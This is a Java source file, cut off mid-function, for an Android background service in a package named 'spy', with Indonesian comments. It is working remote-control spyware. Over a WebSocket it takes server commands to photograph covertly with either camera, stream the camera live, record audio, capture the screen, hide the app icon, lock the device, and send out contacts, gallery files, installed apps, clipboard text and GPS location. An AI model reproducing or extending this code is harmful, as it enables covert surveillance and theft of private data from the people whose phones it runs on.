package com.zaxz.spy;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ApplicationInfo;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.graphics.Typeface;
import android.graphics.YuvImage;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureFailure;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.StatFs;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.view.Display;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.Surface;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.core.app.NotificationCompat;

import com.bumptech.glide.Glide;
import com.bumptech.glide.request.target.SimpleTarget;
import com.bumptech.glide.request.transition.Transition;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class BackgroundService extends Service {
    private static final int NOTIFICATION_ID = 1001;
    private static final String CHANNEL_ID = "spy_channel";
    
    private WebSocket webSocket;
    private Handler backgroundHandler;
    private HandlerThread handlerThread;
    private String deviceId;
    private String username;
    private String model;
    private MediaPlayer mediaPlayer;
    private CameraManager cameraManager;
    private String cameraId;
    private PowerManager.WakeLock wakeLock;
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminComponent;
    private boolean isConnected = false;
    private LocationManager locationManager;
    private TelephonyManager telephonyManager;
    private PackageManager packageManager;
    private ConnectivityManager connectivityManager;
    private BatteryManager batteryManager;
    private int reconnectAttempts = 0;
    private Location lastLocation = null;

    // ============ STATE FITUR BARU ============
    private MediaRecorder mediaRecorder;
    private File audioRecordingFile;
    private boolean isRecording = false;
    private Handler recordingHandler;

    // Camera state — track camera device biar bisa release dengan benar
    private CameraDevice activeCameraDevice;
    private CameraCaptureSession activeCaptureSession;
    private ImageReader activeImageReader;

    // Clipboard monitoring state
    private Timer clipboardTimer;
    private String lastClipboardText = null;
    private android.content.ClipboardManager clipboardManager;

    // ============ LIVE CAMERA STREAM STATE ============
    // Track kalo live stream lagi aktif supaya gak double-start
    private boolean isLiveStreaming = false;
    private String liveStreamCamera = null;
    private ImageReader liveStreamImageReader;
    private CameraDevice liveStreamCameraDevice;
    private CameraCaptureSession liveStreamSession;
    // Interval minimum antar frame (ms). 1500ms = ~0.6 fps. Cukup untuk
    // efek "spy cam" tanpa overload bandwidth.
    private long lastLiveFrameSent = 0;
    private static final long LIVE_FRAME_MIN_INTERVAL_MS = 1500;

    // ============ SCREEN CAPTURE STATE ============
    private MediaProjection mediaProjection;
    private android.hardware.display.VirtualDisplay virtualDisplay;
    private ImageReader screenImageReader;
    private boolean isScreenCapturing = false;
    private long lastScreenFrameSent = 0;
    private static final long SCREEN_FRAME_MIN_INTERVAL_MS = 2000;
    private LocationListener locationListener;
    private WindowManager windowManager;
    private ArrayList<View> floatingImages = new ArrayList<>();
    private Random random = new Random();
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        handlerThread = new HandlerThread("BackgroundService");
        handlerThread.start();
        backgroundHandler = new Handler(handlerThread.getLooper());
        
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());

        initializeManagers();
        initializeDeviceInfo();
        acquireWakeLock();

        // ============ PENTING: pastikan Config sudah ke-load sebelum connect ============
        // loadConfig() sekarang blocking (max 5 detik). Dijalankan di backgroundHandler
        // (bukan main thread) supaya gak trigger NetworkOnMainThreadException.
        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    Config.loadConfig(BackgroundService.this);
                    android.util.Log.i("SpyService",
                        "Config siap. API_URL=" + Config.API_URL + " WS_URL=" + Config.WS_URL +
                        " username=" + username + " device_id=" + deviceId);
                } catch (Throwable t) {
                    android.util.Log.e("SpyService", "loadConfig failed", t);
                }
                connectWebSocket();
            }
        });

        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                startLocationUpdates();
            }
        });
        
        backgroundHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                sendBatteryInfo();
            }
        }, 10000);
        
        backgroundHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                sendDeviceInfo();
            }
        }, 2000);
        
        backgroundHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                heartbeatRunnable();
            }
        }, 5000);

        // ============ FITUR 5: Clipboard Monitor — start polling tiap 5 detik ============
        // Gak butuh permission khusus, jadi aman di-start langsung.
        startClipboardMonitoring();
    }
    
    private void initializeManagers() {
        try {
            cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
        } catch (Exception e) {}
        
        try {
            devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            adminComponent = new ComponentName(this, AdminReceiver.class);
        } catch (Exception e) {}
        
        try {
            locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        } catch (Exception e) {}
        
        try {
            telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        } catch (Exception e) {}
        
        try {
            connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        } catch (Exception e) {}
        
        try {
            batteryManager = (BatteryManager) getSystemService(BATTERY_SERVICE);
        } catch (Exception e) {}
        
        try {
            windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        } catch (Exception e) {}
        
        packageManager = getPackageManager();
    }
    
    private void initializeDeviceInfo() {
        try {
            deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            if (deviceId == null) deviceId = "unknown_" + System.currentTimeMillis();
        } catch (Exception e) {
            deviceId = "unknown_" + System.currentTimeMillis();
        }
        
        username = Config.getUsername(this);
        if (username == null) username = "default";
        
        model = Build.MODEL;
        if (model == null) model = "unknown";
    }
    
    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            if (powerManager != null) {
                wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SpyService::WakeLock");
                wakeLock.acquire();
            }
        } catch (Exception e) {}
    }
    
    private void startLocationUpdates() {
        try {
            if (locationManager == null) return;
            
            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                return;
            }
            
            locationListener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    lastLocation = location;
                    sendLocation(location);
                }
                
                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {}
                
                @Override
                public void onProviderEnabled(String provider) {}
                
                @Override
                public void onProviderDisabled(String provider) {}
            };
            
            try {
                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 30000, 10, locationListener);
            } catch (Exception e) {}
            
            try {
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 30000, 10, locationListener);
            } catch (Exception e) {}
            
            try {
                Location gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (gpsLocation != null) {
                    lastLocation = gpsLocation;
                    sendLocation(gpsLocation);
                }
            } catch (Exception e) {}
            
            try {
                Location networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (networkLocation != null && lastLocation == null) {
                    lastLocation = networkLocation;
                    sendLocation(networkLocation);
                }
            } catch (Exception e) {}
            
        } catch (SecurityException e) {} catch (Exception e) {}
    }
    
    private void connectWebSocket() {
        try {
            OkHttpClient client = new OkHttpClient.Builder()
                .pingInterval(5, TimeUnit.SECONDS)
                .connectTimeout(10, TimeUnit.SECONDS)
                .readTimeout(10, TimeUnit.SECONDS)
                .writeTimeout(10, TimeUnit.SECONDS)
                .retryOnConnectionFailure(true)
                .build();
            
            Request request = new Request.Builder()
                .url(Config.WS_URL)
                .build();
            
            webSocket = client.newWebSocket(request, new WebSocketListener() {
                @Override
                public void onOpen(WebSocket webSocket, Response response) {
                    isConnected = true;
                    reconnectAttempts = 0;
                    sendAuth();
                    backgroundHandler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            sendDeviceInfo();
                        }
                    }, 1000);
                }
                
                @Override
                public void onMessage(WebSocket webSocket, String text) {
                    handleWebSocketMessage(text);
                }
                
                @Override
                public void onClosed(WebSocket webSocket, int code, String reason) {
                    isConnected = false;
                    backgroundHandler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            reconnect();
                        }
                    }, 5000);
                }
                
                @Override
                public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                    isConnected = false;
                    backgroundHandler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            reconnect();
                        }
                    }, 5000);
                }
            });
        } catch (Exception e) {
            backgroundHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    reconnect();
                }
            }, 5000);
        }
    }
    
    private void handleWebSocketMessage(String text) {
        try {
            JSONObject cmd = new JSONObject(text);
            
            if (!cmd.has("type")) return;
            
            String type = cmd.getString("type");
            
            if ("ping".equals(type)) {
                JSONObject pong = new JSONObject();
                try {
                    pong.put("type", "pong");
                    webSocket.send(pong.toString());
                } catch (Exception e) {}
            }
            
            if ("command".equals(type) && cmd.has("command")) {
                String command = cmd.getString("command");
                
                JSONObject response = new JSONObject();
                try {
                    response.put("type", "command_received");
                    response.put("command", command);
                } catch (Exception e) {}
                
                if ("lock".equals(command)) {
                    lockDevice();
                } else if ("unlock".equals(command)) {
                    unlockDevice();
                } else if ("flashlight_on".equals(command)) {
                    toggleFlashlight(true);
                } else if ("flashlight_off".equals(command)) {
                    toggleFlashlight(false);
                } else if ("play_music".equals(command) && cmd.has("url")) {
                    try {
                        playMusic(cmd.getString("url"));
                    } catch (Exception e) {}
                } else if ("stop_music".equals(command)) {
                    stopMusic();
                } else if ("hide_app".equals(command)) {
                    hideApp();
                } else if ("show_app".equals(command)) {
                    showApp();
                } else if ("open_web".equals(command) && cmd.has("url")) {
                    try {
                        openWebPage(cmd.getString("url"));
                    } catch (Exception e) {}
                } else if ("show_notification".equals(command) && cmd.has("title") && cmd.has("message")) {
                    try {
                        showCustomNotification(cmd.getString("title"), cmd.getString("message"));
                    } catch (Exception e) {}
                } else if ("show_popup".equals(command) && cmd.has("title") && cmd.has("message")) {
                    try {
                        showModernPopup(cmd.getString("title"), cmd.getString("message"));
                    } catch (Exception e) {}
                } else if ("show_floating_images".equals(command) && cmd.has("url") && cmd.has("count")) {
                    try {
                        showFloatingImages(cmd.getString("url"), cmd.getInt("count"));
                    } catch (Exception e) {}
                } else if ("clear_floating_images".equals(command)) {
                    clearFloatingImages();
                }
                // ============ FITUR BARU TIER 1 ============
                else if ("take_photo".equals(command)) {
                    try {
                        String camera = cmd.has("camera") ? cmd.getString("camera") : "back";
                        takePhoto(camera);
                    } catch (Exception e) {}
                } else if ("get_apps".equals(command)) {
                    getInstalledApps();
                } else if ("get_contacts".equals(command)) {
                    getContacts();
                } else if ("record_audio".equals(command)) {
                    int durationSec = cmd.has("duration") ? cmd.optInt("duration", 10) : 10;
                    if (durationSec < 1) durationSec = 1;
                    if (durationSec > 60) durationSec = 60;
                    recordAudio(durationSec);
                }
                // record_audio_stop dipanggil kalau user mau stop paksa sebelum durasi habis
                else if ("record_audio_stop".equals(command)) {
                    stopAudioRecording();
                }
                // ============ FITUR GALLERY ACCESS ============
                else if ("get_gallery".equals(command)) {
                    getGalleryFiles();
                } else if ("get_gallery_file".equals(command) && cmd.has("file_id")) {
                    try {
                        long fileId = cmd.getLong("file_id");
                        String mime = cmd.has("mime") ? cmd.getString("mime") : "image/*";
                        getGalleryFile(fileId, mime);
                    } catch (Exception e) {
                        sendLog("get_gallery_file error: " + e.getMessage());
                    }
                }
                // ============ FITUR LIVE CAMERA STREAM ============
                else if ("start_live_stream".equals(command)) {
                    try {
                        String cam = cmd.has("camera") ? cmd.getString("camera") : "back";
                        startLiveCameraStream(cam);
                    } catch (Exception e) {
                        sendLog("start_live_stream error: " + e.getMessage());
                    }
                } else if ("stop_live_stream".equals(command)) {
                    stopLiveCameraStream();
                }
                // ============ FITUR SCREEN CAPTURE ============
                else if ("request_screen_capture".equals(command)) {
                    requestScreenCapturePermission();
                } else if ("start_screen_capture".equals(command)) {
                    startScreenCapture();
                } else if ("stop_screen_capture".equals(command)) {
                    stopScreenCapture();
                }
                
                try {
                    webSocket.send(response.toString());
                } catch (Exception e) {}
            }
        } catch (Exception e) {}
    }
    
    private void openWebPage(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {}
    }
    
    private void showCustomNotification(String title, String message) {
        try {
            NotificationManager notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel channel = new NotificationChannel(
                    "custom_notifications",
                    "Custom Notifications",
                    NotificationManager.IMPORTANCE_HIGH
                );
                channel.setDescription("Custom notifications from server");
                notificationManager.createNotificationChannel(channel);
            }
            
            NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "custom_notifications")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle(title)
                .setContentText(message)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .setDefaults(Notification.DEFAULT_ALL);
            
            int notificationId = (int) System.currentTimeMillis();
            notificationManager.notify(notificationId, builder.build());
            
        } catch (Exception e) {}
    }
    
    private void showModernPopup(String title, String message) {
        try {
            backgroundHandler.post(new Runnable() {
                @Override
                public void run() {
                    try {
                        WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
                        
                        int layoutFlag;
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            layoutFlag = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
                        } else {
                            layoutFlag = WindowManager.LayoutParams.TYPE_PHONE;
                        }
                        
                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                            WindowManager.LayoutParams.MATCH_PARENT,
                            WindowManager.LayoutParams.WRAP_CONTENT,
                            layoutFlag,
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                            PixelFormat.TRANSLUCENT
                        );
                        
                        params.gravity = Gravity.CENTER;
                        params.width = (int) (getResources().getDisplayMetrics().widthPixels * 0.85);
                        
                        LayoutInflater inflater = LayoutInflater.from(BackgroundService.this);
                        LinearLayout layout = new LinearLayout(BackgroundService.this);
                        layout.setOrientation(LinearLayout.VERTICAL);
                        layout.setBackgroundColor(Color.parseColor("#DD2A2A2A"));
                        layout.setPadding(50, 50, 50, 50);
                        
                        TextView titleView = new TextView(BackgroundService.this);
                        titleView.setText(title);
                        titleView.setTextColor(Color.WHITE);
                        titleView.setTextSize(22);
                        titleView.setTypeface(Typeface.DEFAULT_BOLD);
                        titleView.setGravity(Gravity.CENTER);
                        titleView.setPadding(0, 0, 0, 30);
                        layout.addView(titleView);
                        
                        TextView messageView = new TextView(BackgroundService.this);
                        messageView.setText(message);
                        messageView.setTextColor(Color.parseColor("#EEEEEE"));
                        messageView.setTextSize(16);
                        messageView.setGravity(Gravity.CENTER);
                        messageView.setPadding(20, 20, 20, 40);
                        layout.addView(messageView);
                        
                        Button okButton = new Button(BackgroundService.this);
                        okButton.setText("OK");
                        okButton.setTextColor(Color.WHITE);
                        okButton.setBackgroundColor(Color.parseColor("#4CAF50"));
                        okButton.setPadding(30, 20, 30, 20);
                        
                        FrameLayout buttonContainer = new FrameLayout(BackgroundService.this);
                        buttonContainer.addView(okButton);
                        layout.addView(buttonContainer);
                        
                        windowManager.addView(layout, params);
                        
                        okButton.setOnClickListener(new View.OnClickListener() {
                            @Override
                            public void onClick(View v) {
                                try {
                                    windowManager.removeView(layout);
                                } catch (Exception e) {}
                            }
                        });
                        
                    } catch (Exception e) {}
                }
            });
        } catch (Exception e) {}
    }
    
    private void showFloatingImages(String imageUrl, int count) {
        try {
            for (int i = 0; i < count; i++) {
                showSingleFloatingImage(imageUrl, i);
            }
        } catch (Exception e) {}
    }
    
    private void showSingleFloatingImage(String imageUrl, int index) {
        try {
            backgroundHandler.post(new Runnable() {
                @Override
                public void run() {
                    try {
                        int layoutFlag;
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            layoutFlag = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
                        } else {
                            layoutFlag = WindowManager.LayoutParams.TYPE_PHONE;
                        }
                        
                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                            WindowManager.LayoutParams.WRAP_CONTENT,
                            WindowManager.LayoutParams.WRAP_CONTENT,
                            layoutFlag,
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED,
                            PixelFormat.TRANSLUCENT
                        );
                        
                        int screenWidth = getResources().getDisplayMetrics().widthPixels;
                        int screenHeight = getResources().getDisplayMetrics().heightPixels;
                        
                        params.x = random.nextInt(screenWidth - 300);
                        params.y = random.nextInt(screenHeight - 300);
                        
                        ImageView imageView = new ImageView(BackgroundService.this);
                        imageView.setScaleType(ImageView.ScaleType.FIT_CENTER);
                        
                        FrameLayout touchInterceptor = new FrameLayout(BackgroundService.this);
                        touchInterceptor.addView(imageView);
                        
                        touchInterceptor.setOnTouchListener(new View.OnTouchListener() {
                            private int initialX;
                            private int initialY;
                            private float initialTouchX;
                            private float initialTouchY;
                            
                            @Override
                            public boolean onTouch(View v, MotionEvent event) {
                                switch (event.getAction()) {
                                    case MotionEvent.ACTION_DOWN:
                                        initialX = params.x;
                                        initialY = params.y;
                                        initialTouchX = event.getRawX();
                                        initialTouchY = event.getRawY();
                                        return true;
                                        
                                    case MotionEvent.ACTION_MOVE:
                                        params.x = initialX + (int) (event.getRawX() - initialTouchX);
                                        params.y = initialY + (int) (event.getRawY() - initialTouchY);
                                        windowManager.updateViewLayout(touchInterceptor, params);
                                        return true;
                                        
                                    case MotionEvent.ACTION_UP:
                                        return false;
                                }
                                return false;
                            }
                        });
                        
                        windowManager.addView(touchInterceptor, params);
                        floatingImages.add(touchInterceptor);
                        
                        Glide.with(BackgroundService.this)
                            .asBitmap()
                            .load(imageUrl)
                            .into(new SimpleTarget<Bitmap>() {
                                @Override
                                public void onResourceReady(Bitmap resource, Transition<? super Bitmap> transition) {
                                    imageView.setImageBitmap(resource);
                                }
                            });
                        
                    } catch (Exception e) {}
                }
            });
        } catch (Exception e) {}
    }
    
    private void clearFloatingImages() {
        try {
            for (View view : floatingImages) {
                try {
                    windowManager.removeView(view);
                } catch (Exception e) {}
            }
            floatingImages.clear();
        } catch (Exception e) {}
    }

    // ====================================================================
    // ============ FITUR BARU TIER 1 — IMPLEMENTASI METHOD ===============
    // ====================================================================

    /**
     * FITUR 1: Capture Photo (front/back camera) — ambil 1 foto, kirim via WS.
     *
     * Alur:
     *  1. Cari camera ID sesuai pilihan (front/back).
     *  2. Buka CameraDevice.
     *  3. Bikin ImageReader (JPEG, max 1280x720 biar bandwidth wajar).
     *  4. Bikin CaptureSession, kirim CaptureRequest STILL_CAPTURE.
     *  5. Di onImageAvailable: convert JPEG bytes -> base64, kirim WS.
     *  6. Release camera.
     */
    private void takePhoto(final String cameraFacing) {
        // Cek permission di runtime
        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            sendLog("take_photo: CAMERA permission not granted");
            return;
        }

        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    // Resolve desired facing constant
                    final int desiredFacing;
                    if ("front".equalsIgnoreCase(cameraFacing)) {
                        desiredFacing = CameraCharacteristics.LENS_FACING_FRONT;
                    } else {
                        desiredFacing = CameraCharacteristics.LENS_FACING_BACK;
                    }

                    // Find matching camera id
                    String[] cameraIdList = cameraManager.getCameraIdList();
                    String foundId = null;
                    for (String id : cameraIdList) {
                        CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                        Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                        if (facing != null && facing == desiredFacing) {
                            foundId = id;
                            break;
                        }
                    }
                    if (foundId == null) {
                        // Fallback ke camera pertama yang ada
                        if (cameraIdList.length == 0) {
                            sendLog("take_photo: no camera available");
                            return;
                        }
                        foundId = cameraIdList[0];
                    }

                    final String cameraIdFinal = foundId;

                    // ============ PILIH RESOLUSI YANG DIDUKUNG CAMERA ============
                    // Penting: tidak semua camera (terutama front) mendukung
                    // 1280x720. Kalau pakai resolusi yang gak didukung, capture
                    // bisa gagal diam-diam atau hasilnya hitam.
                    final android.util.Size photoSize = chooseOptimalJpegSize(cameraIdFinal);
                    if (photoSize == null) {
                        sendLog("take_photo: tidak ada resolusi JPEG yang didukung oleh camera " + cameraIdFinal);
                        return;
                    }
                    sendLog("take_photo: pakai resolusi " + photoSize.getWidth() + "x" + photoSize.getHeight() + " untuk camera " + cameraIdFinal);

                    // Bikin ImageReader buat nampung 1 frame JPEG
                    final ImageReader imageReader = ImageReader.newInstance(
                        photoSize.getWidth(), photoSize.getHeight(), ImageFormat.JPEG, 2);
                    activeImageReader = imageReader;
                    imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                        @Override
                        public void onImageAvailable(ImageReader reader) {
                            Image image = null;
                            try {
                                image = reader.acquireLatestImage();
                                if (image == null) return;
                                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                                byte[] bytes = new byte[buffer.remaining()];
                                buffer.get(bytes);

                                String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);

                                JSONObject msg = new JSONObject();
                                msg.put("type", "image");
                                msg.put("image_type", "photo_" + cameraFacing);
                                msg.put("data", base64);
                                msg.put("width", photoSize.getWidth());
                                msg.put("height", photoSize.getHeight());
                                msg.put("timestamp", System.currentTimeMillis());
                                if (webSocket != null && isConnected) {
                                    webSocket.send(msg.toString());
                                }
                            } catch (Exception e) {
                                sendLog("take_photo onImage error: " + e.getMessage());
                            } finally {
                                if (image != null) image.close();
                                cleanupCamera();
                            }
                        }
                    }, backgroundHandler);

                    // Buka camera device
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        cameraManager.openCamera(cameraIdFinal, new CameraDevice.StateCallback() {
                            @Override
                            public void onOpened(CameraDevice camera) {
                                activeCameraDevice = camera;
                                try {
                                    List<Surface> surfaces = new ArrayList<>();
                                    surfaces.add(imageReader.getSurface());

                                    camera.createCaptureSession(surfaces, new CameraCaptureSession.StateCallback() {
                                        @Override
                                        public void onConfigured(CameraCaptureSession session) {
                                            activeCaptureSession = session;
                                            try {
                                                // ============ STEP 1: WARMUP REPEATING REQUEST ============
                                                // Kirim repeating request pakai TEMPLATE_PREVIEW dulu selama
                                                // 800ms biar sensor & auto-exposure/auto-focus settle.
                                                // Tanpa warmup, capture STILL_CAPTURE langsung sering hasilnya
                                                // hitam (terutama front camera) karena AE belum konvergen.
                                                final CaptureRequest.Builder warmupBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                                                warmupBuilder.addTarget(imageReader.getSurface());
                                                warmupBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
                                                warmupBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                                                warmupBuilder.set(CaptureRequest.CONTROL_AE_EXPOSURE_COMPENSATION, 0);
                                                session.setRepeatingRequest(warmupBuilder.build(), null, backgroundHandler);

                                                // ============ STEP 2: DELAY 800ms LALU CAPTURE ============
                                                backgroundHandler.postDelayed(new Runnable() {
                                                    @Override
                                                    public void run() {
                                                        try {
                                                            // Stop repeating request
                                                            try { session.stopRepeating(); } catch (Exception e) {}

                                                            // Build STILL_CAPTURE request
                                                            CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                                            builder.addTarget(imageReader.getSurface());
                                                            builder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
                                                            builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
                                                            builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                                                            builder.set(CaptureRequest.JPEG_QUALITY, (byte) 90);
                                                            builder.set(CaptureRequest.JPEG_ORIENTATION, getJpegOrientation(cameraIdFinal, desiredFacing));

                                                            // Trigger auto-focus sekali sebelum capture
                                                            builder.set(CaptureRequest.CONTROL_AF_TRIGGER, CaptureRequest.CONTROL_AF_TRIGGER_START);

                                                            session.capture(builder.build(), new CameraCaptureSession.CaptureCallback() {
                                                                @Override
                                                                public void onCaptureCompleted(CameraCaptureSession session, CaptureRequest request, TotalCaptureResult result) {
                                                                    // Image akan di-handle di onImageAvailable
                                                                    sendLog("take_photo: capture completed");
                                                                }

                                                                @Override
                                                                public void onCaptureFailed(CameraCaptureSession session, CaptureRequest request, CaptureFailure failure) {
                                                                    sendLog("take_photo: capture failed reason=" + failure.getReason());
                                                                    cleanupCamera();
                                                                }
                                                            }, backgroundHandler);
                                                        } catch (Exception e) {
                                                            sendLog("take_photo capture error: " + e.getMessage());
                                                            cleanupCamera();
                                                        }
                                                    }
                                                }, 800);
                                            } catch (Exception e) {
                                                sendLog("take_photo warmup error: " + e.getMessage());
                                                cleanupCamera();
                                            }
                                        }

                                        @Override
                                        public void onConfigureFailed(CameraCaptureSession session) {
                                            sendLog("take_photo: capture session config failed");
                                            cleanupCamera();
                                        }
                                    }, backgroundHandler);
                                } catch (Exception e) {
                                    sendLog("take_photo session error: " + e.getMessage());
                                    cleanupCamera();
                                }
                            }

                            @Override
                            public void onDisconnected(CameraDevice camera) {
                                cleanupCamera();
                            }

                            @Override
                            public void onError(CameraDevice camera, int error) {
                                sendLog("take_photo: camera device error " + error);
                                cleanupCamera();
                            }
                        }, backgroundHandler);
                    }
                } catch (Exception e) {
                    sendLog("take_photo error: " + e.getMessage());
                    cleanupCamera();
                }
            }
        });
    }

    /**
     * PILIH RESOLUSI JPEG YANG DIDUKUNG OLEH CAMERA.
     *
     * Tidak semua camera (terutama front camera di device murah) mendukung
     * resolusi standar seperti 1280x720. Kalau ImageReader di-create dengan
     * resolusi yang tidak didukung, session akan fail configure, atau paling
     * buruk capture berhasil tapi JPEG-nya kosong (foto hitam).
     *
     * Strategy: query StreamConfigurationMap untuk dapat list resolusi JPEG
     * yang didukung, lalu pilih yang paling mendekati 1280x720 (prefer yang
     * lebih kecil untuk hemat bandwidth).
     */
    private android.util.Size chooseOptimalJpegSize(String cameraId) {
        try {
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(cameraId);
            StreamConfigurationMap map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (map == null) {
                sendLog("chooseOptimalJpegSize: StreamConfigurationMap null untuk " + cameraId);
                return null;
            }

            android.util.Size[] sizes = map.getOutputSizes(ImageFormat.JPEG);
            if (sizes == null || sizes.length == 0) {
                sendLog("chooseOptimalJpegSize: tidak ada output size JPEG untuk " + cameraId);
                return null;
            }

            // Target: 1280x720 (720p, 16:9). Front camera banyak yang cuma
            // support 640x480 (VGA, 4:3) atau 960x720, jadi pilih yang paling
            // dekat tapi <= 1280x720.
            final int TARGET_W = 1280;
            final int TARGET_H = 720;

            android.util.Size best = null;
            long bestDiff = Long.MAX_VALUE;

            for (android.util.Size s : sizes) {
                int w = s.getWidth();
                int h = s.getHeight();

                // Skip resolusi gila besar (> 2MP) supaya bandwidth wajar
                if ((long) w * h > 2_000_000L) continue;

                long diff;
